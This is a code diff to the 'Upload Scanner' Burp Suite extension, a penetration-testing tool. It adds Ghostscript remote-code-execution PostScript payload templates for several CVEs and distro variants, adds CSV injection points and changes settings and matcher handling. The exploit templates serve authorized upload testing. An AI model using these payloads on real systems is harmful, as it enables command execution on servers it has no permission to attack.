@@ -313,7 +313,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             ('', '.gs', ''),
             ('', '.eps', ''),
             ('', BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
-            # ('', '.gif', 'image/gif'),
+            ('', '.jpeg', 'image/jpeg'),
             ('', '.png', 'image/png'),
         }
 
@@ -496,6 +496,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             print "Deserializing settings..."
             self.deserialize_settings()
 
+
         # It is important these registrations are done at the end, so the global_lock is freed.
         # Otherwise when still deserializing and using the context menu at the same time there
         # has been a global Burp thread-lock where I had to force quit Burp :(
@@ -587,43 +588,53 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             print "Deleted all settings..."
 
     def deserialize_settings(self):
-        k = self.load_project_setting("UploadScanner_dl_matchers")
-        if k:
-            dm = pickle.loads(k.decode("base64"))
-            if dm:
-                self.dl_matchers.deserialize(dm)
+        try:
+            k = self.load_project_setting("UploadScanner_dl_matchers")
+            if k:
+                dm = pickle.loads(k.decode("base64"))
+                if dm:
+                    self.dl_matchers.deserialize(dm)
 
-        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
-        #k = self.load_project_setting("UploadScanner_collab_monitor")
-        #if k:
-        #    cm = pickle.loads(k.decode("base64"))
-        #    self.collab_monitor.deserialize(cm)
+            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
+            #k = self.load_project_setting("UploadScanner_collab_monitor")
+            #if k:
+            #    cm = pickle.loads(k.decode("base64"))
+            #    self.collab_monitor.deserialize(cm)
 
-        k = self.load_project_setting("UploadScanner_tabs")
-        if k:
-            tabs = pickle.loads(k.decode("base64"))
-            if tabs:
-                for option_panel in tabs:
-                    # right part, create with dummy request first first
-                    sc = ScanController(CustomRequestResponse('', '', CustomHttpService('https://example.org'), '', ''), self._callbacks)
-                    # left part, options
-                    # add a reference to the ScanController to the options
-                    options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
-                    # Take all settings from the serialized object (also recursively changes ScanController)
-                    options.deserialize(option_panel)
-                    self.create_tab(options, sc)
+            k = self.load_project_setting("UploadScanner_tabs")
+            if k:
+                tabs = pickle.loads(k.decode("base64"))
+                if tabs:
+                    for option_panel in tabs:
+                        # right part, create with dummy request first first
+                        sc = ScanController(CustomRequestResponse('', '', CustomHttpService('https://example.org'), '', ''), self._callbacks)
+                        # left part, options
+                        # add a reference to the ScanController to the options
+                        options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
+                        # Take all settings from the serialized object (also recursively changes ScanController)
+                        options.deserialize(option_panel)
+                        self.create_tab(options, sc)
 
-        k = self._callbacks.loadExtensionSetting("UploadScanner_global_opts")
-        if k:
-            cm = pickle.loads(k.decode("base64"))
-            if cm:
-                self._global_opts.deserialize(cm)
+            k = self._callbacks.loadExtensionSetting("UploadScanner_global_opts")
+            if k:
+                cm = pickle.loads(k.decode("base64"))
+                if cm:
+                    self._global_opts.deserialize(cm)
+            print "Restored settings..."
+        except:
+            e = traceback.format_exc()
+            print "An error occured when deserializing settings. We just ignore the serialized data therefore."
+            print e
 
-        print "Restored settings..."
-        self.save_project_setting("UploadScanner_dl_matchers", "")
-        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
-        #self.save_project_setting("UploadScanner_collab_monitor", None)
-        self.save_project_setting("UploadScanner_tabs", "")
+        try:
+            self.save_project_setting("UploadScanner_dl_matchers", "")
+            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
+            #self.save_project_setting("UploadScanner_collab_monitor", None)
+            self.save_project_setting("UploadScanner_tabs", "")
+        except:
+            e = traceback.format_exc()
+            print "An error occured when storing empty serialize data We just ignore it for now."
+            print e
 
     def save_project_setting(self, name, value):
         request = """GET /"""+name+""" HTTP/1.0
@@ -724,7 +735,6 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             f = file("BappManifest.bmf", "rb").readlines()
             for line in f:
                 if line.startswith("ScreenVersion: "):
-                    print line
                     error_details += "\n" + line.replace("ScreenVersion", "Upload Scanner Version")
                     break
         except:
@@ -734,6 +744,12 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             error_details += "\nJava version: " + System.getProperty("java.version")
         except:
             print "Could not find Jython/Java version..."
+        try:
+            error_details += "\nBurp version: " + " ".join([x for x in self._callbacks.getBurpVersion()])
+            error_details += "\nCommand line arguments: " + " ".join([x for x in self._callbacks.getCommandLineArguments()])
+            error_details += "\nWas loaded from BApp: " + str(self._callbacks.isExtensionBapp())
+        except:
+            print "Could not find Burp details..."
         self._no_of_errors += 1
         if self._no_of_errors < 2:
             full_msg = 'The Burp extension "Upload Scanner" just crashed. The details of the issue are at the bottom. \n' \
@@ -853,7 +869,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
                         # As the matcher was now triggered, we can remove it as it should not trigger again,
                         # because every attack defines its own matcher
-                        self.dl_matchers.remove(url, matcher)
+                        self.dl_matchers.remove_reported(url, matcher)
 
                         # At maximum there will be 1 scan issue per message, as it is unlikely that there is more than 1
                         # download in a HTTP message. Therefore we can use "return" after adding a scan issue.
@@ -956,7 +972,13 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             burp_colab = None
             print "Warning: No Burp Collaborator will be used"
         colab_tests = []
+
+        # We need to make sure that the global download matchers are from now on active for the URL we scan
+        url = FloydsHelpers.u2s(self._helpers.analyzeRequest(injector.get_brr()).getUrl().toString())
+        self.dl_matchers.add_collection(url)
+
         scan_was_stopped = False
+
         try:
             # Sanity/debug check. Simply uploads a white picture called screenshot_white.png
             print "Doing sanity check and uploading a white png file called screenshot_white.png"
@@ -1337,10 +1359,9 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         name = "Ghostscript RCE"
         severity = "High"
         confidence = "Certain"
-        techniques = (("OutputICCProfile", "CVE-2016-7976"), ("OutputFile", "CVE-2017-8291"))
         base_detail = "A ghostscript file with RCE payload was uploaded. See " \
                       "http://www.openwall.com/lists/oss-security/2016/09/30/8 and http://cve.circl.lu/cve/CVE-2017-8291 " \
-                      "for details. "
+                      "and http://openwall.com/lists/oss-security/2018/08/21/2 for details. "
         detail_sleep = "A delay was dectected twice when uploading a ghostscript file with a payload that " \
                        "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
                        "The payload used the {} argument ({}) and the payload {}."
@@ -1348,17 +1369,68 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                        "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
                        "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
         basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Gs"
-        content = "%!PS\n" \
-                  "currentdevice null true mark /{} (%pipe%{} {} )\n" \
-                  ".putdeviceparams\n" \
-                  "quit"
+
+        content_original_cve = "%!PS\n" \
+                               "currentdevice null true mark /{} (%pipe%{} {} )\n" \
+                               ".putdeviceparams\n" \
+                               "quit"
+
+        content_2 = "%!PS\n" \
+                    "*legal*\n" \
+                    "*{{ null restore }} stopped {{ pop }} if*\n" \
+                    "*legal*\n" \
+                    "*mark /{} (%pipe%{} {}) currentdevice putdeviceprops*\n" \
+                    "*showpage*"
+
+        content_ubuntu = "%!PS\n" \
+                         "userdict /setpagedevice undef\n" \
+                         "save\n" \
+                         "legal\n" \
+                         "{{ null restore }} stopped {{ pop }} if\n" \
+                         "{{ legal }} stopped {{ pop }} if\n" \
+                         "restore\n" \
+                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"
+
+        content_centos = "%!PS\n" \
+                         "userdict /setpagedevice undef\n" \
+                         "legal\n" \
+                         "{{ null restore }} stopped {{ pop }} if\n" \
+                         "legal\n" \
+                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"
+
+        techniques = (
+            ("OutputFile", "CVE-2017-8291", content_original_cve),
+            ("OutputICCProfile", "CVE-2016-7976", content_original_cve),
+
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
+
+            # OutputFile worked on a Linux minti 4.8.0-53-generic #56~16.04.1-Ubuntu SMP Tue May 16 01:18:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+            # With "identify" and "convert" from ImageMagick 6.8.9-9 Q16 x86_64 2017-03-14
+            # But OutputICCProfile didn't:
+            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
+            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
+            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
+            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
+
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
+        )
 
         # Sleep based
-        for param, cve in techniques:
-            for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
-                details = base_detail + detail_sleep.format(param, cve, cmd)
-                issue = self._create_issue_template(injector.get_brr(), name + " " + cve, details, confidence, severity)
-                sleep_content = content.format(param, cmd, str(injector.opts.sleep_time * factor) + args)
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            for param, reference, content in techniques:
+                details = base_detail + detail_sleep.format(param, reference, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                sleep_content = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    param,
+                    cmd,
+                    str(injector.opts.sleep_time * factor) + args
+                )
                 self._send_sleep_based(injector, basename + cmd_name, sleep_content, self.GS_TYPES, injector.opts.sleep_time, issue)
 
         # Burp community edition doesn't have Burp collaborator
@@ -1367,11 +1439,17 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         colab_tests = []
 
         # Colab based
-        for param, cve in techniques:
-            for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
-                details = base_detail + detail_colab.format(param, cve, cmd)
-                issue = self._create_issue_template(injector.get_brr(), name + " " + cve, details, confidence, severity)
-                attack = content.format(param, cmd, server)
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            for param, reference, content in techniques:
+                details = base_detail + detail_colab.format(param, reference, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                attack = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    param,
+                    cmd,
+                    server
+                )
                 colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + param + cmd_name,
                                                            attack, issue, replace=replace, redownload=True))
 
@@ -3126,16 +3204,18 @@ trailer <<
         confidence = "Tentative"
         print "Fingerping module was able to download", str(number_of_responses), \
             "of", str(len(FingerpingImages.all_images)), "images as PNGs again"
-        if number_of_responses < 10:
-            # This is guesswork, no point in making an issue, stop here
-            print "Fingerping: Could download less than 10 images, not making a fingerping issue"
-            return
-        elif number_of_responses > 50:
-            confidence = "Certain"
-        elif number_of_responses > 40:
-            confidence = "Firm"
         results, fingerprintScores = f.do_tests(downloads, True)
-        result_table = f.get_results_table(fingerprintScores)
+        text_score, total = f.get_results_table(fingerprintScores)
+        highest_score = text_score[-1][1]
+        score_percentage = float(highest_score) / total
+
+        if score_percentage > 0.6:
+            confidence = "Certain"
+        elif score_percentage > 0.85:
+            confidence = "Firm"
+
+        result_table = "<br>".join([text + " " + str(score) + "/" + str(total) for text, score in text_score])
+
         title = "Fingerping Fingerprinting results"
         desc = "The fingerping tool is able to fingerprint images libraries that modify a set of png files that are " \
                "uploaded. The original project by Dominique Bongard is located at https://github.com/0xcite/fingerping " \
@@ -3153,7 +3233,7 @@ trailer <<
                 "together with the exact version of the image library on the server. Please also make sure " \
                 "that the common error case does not apply." \
                "<br><br>{}".format(str(number_of_responses), str(len(FingerpingImages.all_images)),
-                               result_table.replace("\n", "<br>"), repr(results))
+                               result_table, repr(results))
         issue = self._create_issue_template(injector.get_brr(), title, desc, confidence, "Information")
         self._add_scan_issue(issue)
 
@@ -4043,7 +4123,9 @@ trailer <<
                     resp = self._make_http_request(injector, req, throttle=False)
                 if resp and time.time() - start > timeout_detection_time:
                     # found a timeout, let's confirm with a changed request so it doesn't get a cached response
-                    print "TIMEOUT DETECTED! Now checking if really a timeout or just a random timeout"
+                    print "TIMEOUT DETECTED! Now checking if really a timeout or just a random timeout. " \
+                          "Request leading to first timeout was:"
+                    print repr(req)
                     if randomize:
                         number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                     else:
@@ -4066,6 +4148,8 @@ trailer <<
                             self._add_scan_issue(csi)
                             # Returning here is an option, but actually knowing all different kind of injections is nicer
                             # return
+                        else:
+                            print "Unfortunately, this seems to be a false positive... not reporting"
 
     def _create_issue_template(self, base_request_response, name, detail, confidence, severity):
         service = base_request_response.getHttpService()
@@ -4732,7 +4816,6 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                 print "MultipartInjector insertion point found for getInsertionPoint ActiveScan!"
                 insertionPoint = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE, req)
                 injector = MultipartInjector(base_request_response, self._global_opts, insertionPoint, self._helpers, BurpExtender.NEWLINE)
-
             elif self._global_opts.fi_ofilename:
                 fi = FlexiInjector(base_request_response, self._global_opts, self._helpers, BurpExtender.NEWLINE)
                 # We test only those requests where we find at least the content in the request as some implementations
@@ -4741,7 +4824,10 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                     print "FlexiInjector insertion point found for getInsertionPoint ActiveScan!"
                     injector = fi
             if injector:
-                # First handle the zip files
+                # First the feature that we can detect CSVs
+                insertion_points.extend(self._get_csv_insertion_points(injector))
+
+                # Then handle the zip files
                 bf = BackdooredFile(None, tool=self._global_opts.image_exiftool)
                 upload_type = ('', ".zip", BackdooredFile.EXTENSION_TO_MIME[".zip"])
                 # Achieve bf.get_zip_files(payload_func, techniques=["name"])
@@ -4773,6 +4859,87 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
             self.burp_extender.show_error_popup(traceback.format_exc())
             raise sys.exc_info()[1], None, sys.exc_info()[2]
         return insertion_points
+
+    def _get_csv_insertion_points(self, injector):
+        filename = injector.get_uploaded_filename().lower()
+        insertion_points = []
+        if ".csv" in filename or ".txt" in filename:
+            file_content = injector.get_uploaded_content()
+            if "\r\n" in file_content:
+                new_line = "\r\n"
+            else:
+                new_line = "\n"
+            lines = file_content.split(new_line)
+            for delim in [",", ";", "\t"]:
+                if delim in file_content:
+                    # The first line in a CSV can be special (header)
+                    # We choose it at the beginning, but prefer actually any other line in the CSV to inject
+                    # We want to inject into the line with the most delimiters
+                    line_index = 0
+                    no_of_delim = 0
+                    for i, line in enumerate(lines[1:]):
+                        if line.count(delim) > no_of_delim:
+                            line_index = i + 1
+                            no_of_delim = line.count(delim)
+
+                    # This might produce *a lot* of insertion points
+                    for field_index in range(0, no_of_delim + 1):
+                        insertion_points.append(CsvInsertionPoint(injector, new_line, delim, line_index, field_index))
+        return insertion_points
+
+class CsvInsertionPoint(IScannerInsertionPoint):
+    def __init__(self, injector, new_line, delim, line_index, field_index):
+        self.injector = injector
+        self.new_line = new_line
+        self.delim = delim
+        self.line_index = line_index
+        self.field_index = field_index
+
+        self.lines = injector.get_uploaded_content().split(self.new_line)
+        self.fields = self.lines[self.line_index].split(self.delim)
+
+    def _create_request(self, payload):
+        fields = copy.copy(self.fields)
+        if fields[self.field_index].startswith('"') and fields[self.field_index].endswith('"'):
+            # Let's assume it is a quoted CSV
+            # RFC-4180, "If double-quotes are used to enclose fields, then a double-quote appearing inside a
+            # field must be escaped by preceding it with another double quote."
+            payload = '"' +payload.replace('"', '""') + '"'
+            fields[self.field_index] = payload
+        else:
+            fields[self.field_index] = payload
+        line = self.delim.join(fields)
+        lines = copy.copy(self.lines)
+        lines[self.line_index] = line
+        content = self.new_line.join(lines)
+        req = self.injector.get_request(self.injector.get_uploaded_filename(), content)
+        return req, payload
+
+    def buildRequest(self, payload):
+        req, _ = self._create_request(FloydsHelpers.jb2ps(payload))
+        return req
+
+    def getBaseValue(self):
+        return self.fields[self.field_index]
+
+    def getInsertionPointName(self):
+        return ""
+
+    def getInsertionPointType(self):
+        # TODO: What's best? Alternatives:
+        # INS_PARAM_BODY
+        # INS_PARAM_MULTIPART_ATTR
+        # INS_UNKNOWN
+        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED
+
+    def getPayloadOffsets(self, payload):
+        payload = FloydsHelpers.jb2ps(payload)
+        req, payload = self._create_request(payload)
+        if payload in req:
+            start = req.index(payload)
+            return [start, start + len(payload)]
+        else:
+            return None
 
 
 class InsertionPointForActiveScan(IScannerInsertionPoint):
@@ -6594,12 +6761,9 @@ class Fingerping:
 
     def get_results_table(self, scores):
         """Show the fingerprinting result with the most likely library match at the bottom"""
-        res = ''
         nb = len(self.all_tests)
-        ordered = sorted(scores.iteritems(), key=lambda x: x[1])
-        for result in ordered:
-            res += '{:20s} {:3d}/{:3d}'.format(result[0], result[1], nb) + "\n"
-        return res
+        text_score = sorted(scores.iteritems(), key=lambda x: x[1])
+        return text_score, nb
 # end modules
 
 
@@ -6624,15 +6788,20 @@ class DownloadMatcherCollection(object):
         self._thread_lock = threading.Lock()
 
     def add(self, dl_matcher):
+        brr = dl_matcher.issue.get_base_request_response()
+        iRequestInfo = self._helpers.analyzeRequest(brr)
+        url = FloydsHelpers.u2s(iRequestInfo.getUrl().toString())
+        host = self.add_collection(url)
         with self._thread_lock:
-            brr = dl_matcher.issue.get_base_request_response()
-            iRequestInfo = self._helpers.analyzeRequest(brr)
-            url = FloydsHelpers.u2s(iRequestInfo.getUrl().toString())
-            host = self._get_host(url)
-            if host not in self._collection:
-                print "The DownloadMatcherCollection has now passive checks for", host
-                self._collection[host] = set()
             self._collection[host].add(dl_matcher)
+
+    def add_collection(self, url):
+        host = self._get_host(url)
+        with self._thread_lock:
+            if host not in self._collection:
+                print "The DownloadMatcherCollection has now passive checks (at least the global matchers) for", host
+                self._collection[host] = set()
+        return host
 
     def _create_globals(self):
         title = "GraphicsMagick version leakage"
@@ -6674,16 +6843,22 @@ class DownloadMatcherCollection(object):
         dl_matcher = DownloadMatcher(issue, filecontent="tEXtdate:create")
         self._global_matchers.add(dl_matcher)
 
-    def with_global(self, matchers):
+    def with_global(self, name, matchers):
         g = set()
         g.update(matchers)
-        g.update(self._global_matchers)
+        for m in self._global_matchers:
+            if not name in m.reported_for:
+                for alt_name in self._scope_mapping[name]:
+                    if alt_name in m.reported_for:
+                        break
+                else:
+                    g.add(m)
         return g
 
     def add_scope(self, brr_url, url):
+        brr_host = self._get_host(brr_url)
+        host = self._get_host(url)
         with self._thread_lock:
-            brr_host = self._get_host(brr_url)
-            host = self._get_host(url)
             if host in self._collection:
                 return
             if brr_host not in self._scope_mapping:
@@ -6693,32 +6868,43 @@ class DownloadMatcherCollection(object):
                 self._scope_mapping[brr_host].add(host)
 
     def get_matchers_for_url(self, url):
+        hostport = self._get_host(url)
+        if not hostport:
+            print "Couldn't extract hostport from the url", url
+            return []
         with self._thread_lock:
-            hostport = self._get_host(url)
-            if not hostport:
-                return []
             if hostport in self._collection:
-                return self.with_global(self._collection[hostport])
+                # print "Found DownloadMatchers", hostport, "that correspond to", url
+                return self.with_global(hostport, self._collection[hostport])
 
-            for name in self._scope_mapping:
-                if hostport in self._scope_mapping[name]:
-                    if name in self._collection:
-                        return self.with_global(self._collection[name])
+            name = self.get_scope(hostport)
+            if name:
+                # print "Found DownloadMatchers for", name, "that can be used for", url
+                return self.with_global(name, self._collection[name])
         return []
 
-    def remove(self, url, matcher):
+    def get_scope(self, hostport):
+        for name in self._scope_mapping:
+            if hostport in self._scope_mapping[name]:
+                if name in self._collection:
+                    return name
+
+    def remove_reported(self, url, matcher):
         with self._thread_lock:
             hostport = self._get_host(url)
+            if matcher in self._global_matchers:
+                matcher.reported_for.append(hostport)
+                return
             if hostport in self._collection:
                 if matcher in self._collection[hostport]:
                     self._collection[hostport].remove(matcher)
-                else:
-                    # Actually no reason to warn. If multithreaded matchers are triggered, then removing could take
-                    # once but the second match for the same matcher is already waiting for the thread lock to remove it
-                    # print "Warning: Couldn't remove DownloadMatcher as matcher not in {}'s collection".format(hostport)
-                    pass
+                    return
             else:
-                print "Warning: Couldn't remove DownloadMatcher as host:port {} not in {}".format(hostport, self._collection.keys())
+                name = self.get_scope(hostport)
+                if name and name in self._collection:
+                    if matcher in self._collection[name]:
+                        self._collection[name].remove(matcher)
+                        return
 
     def _get_host(self, url):
         if not url:
@@ -6751,6 +6937,7 @@ class DownloadMatcherCollection(object):
         no_of_matchers = 0
         serialized_collection, self._scope_mapping = serialized_object
         for host in serialized_collection:
+            print "Deserializing DownloadMatchers for", host
             self._collection[host] = set()
             for matcher in serialized_collection[host]:
                 # print "Deserialization", host, type(matcher), repr(matcher)
@@ -6807,6 +6994,9 @@ class DownloadMatcher(object):
 
         self.content_type_header_marker = "content-type:"
         self.content_disposition_header_marker = "content-disposition: attachment"
+
+        # Special case to keep track where global matchers were reported already
+        self.reported_for = []
 
     def __hash__(self):
         return hash((self.issue.name,
@@ -7818,7 +8008,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                 if bi.exiftool_present():
                     self.image_exiftool = path
                     self.show_exiftool_field = False
-                    print "Found working exiftool by invoking '" + path+"' on the command line"
+                    print "Found working exiftool by invoking '" + path + "' on the command line"
                     break
             else:
                 print "Searched for exiftool but did not find a proper executable..."
